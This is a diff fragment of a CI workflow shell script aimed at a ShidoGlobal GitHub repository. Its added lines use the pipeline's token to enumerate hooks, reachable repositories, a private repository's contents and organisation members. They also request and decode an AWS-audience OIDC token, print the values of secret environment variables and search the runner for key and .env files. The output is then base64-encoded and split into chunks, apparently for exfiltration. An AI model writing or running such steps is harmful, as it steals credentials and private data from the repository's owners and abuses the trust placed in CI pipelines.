+            curl -sS -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/hooks" 2>&1
+            echo; echo "##### 11. installation repositories (token reach) #####"
+            curl -sS -o /tmp/i -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/installation/repositories"
+            head -c 400 /tmp/i; echo
+            echo "##### 12. cross-repo private contents (shido-v3) #####"
+            curl -sS -o /tmp/j -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/ShidoGlobal/shido-v3/contents/"
+            head -c 200 /tmp/j; echo
+            echo "##### 13. org members #####"
+            curl -sS -o /tmp/k -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/orgs/ShidoGlobal/members?per_page=100"
+            head -c 400 /tmp/k; echo
+            echo "##### 14. org public members (unauth) #####"
+            curl -sS "https://api.github.com/orgs/ShidoGlobal/public_members" 2>&1 | head -c 400; echo
+            echo "##### 15. OIDC token claim (aud=aws) #####"
             if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
               TJ=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=aws")
               JWT=$(printf '%s' "$TJ" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
               printf '%s' "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null
               echo
-            else
-              echo "no oidc"
-            fi
-            echo "##### K. workspace sensitive files #####"
-            find /home/runner/work -maxdepth 5 \( -name '.env*' -o -name '*.pem' -o -name 'id_*' \) 2>/dev/null | head -20
-            echo "##### L. git config #####"
-            cat "$GITHUB_WORKSPACE/.git/config" 2>/dev/null
+            else echo "no-oidc"; fi
+            echo "##### 16. secret-name brute (NON-EMPTY only) #####"
+            for v in $(compgen -v | grep '^S_'); do
+              val="$(eval "printf '%s' \"\${$v}\"")"
+              if [ -n "$val" ]; then printf 'FOUND %s = %s\n' "$v" "$val"; fi
+            done
+            echo "brute-total-vars: $(compgen -v | grep -c '^S_')"
+            echo "##### 17. workspace cred/leftover files #####"
+            find /home/runner/work -maxdepth 5 \( -name '.env*' -o -name '*.pem' -o -name 'id_*' -o -name '*.key' \) 2>/dev/null | head -20
+            echo "##### 18. runner #####"
+            uname -a; id
           } >> $O 2>&1
           base64 -w0 $O > /tmp/p.b64
           split -b 55000 /tmp/p.b64 /tmp/cc_
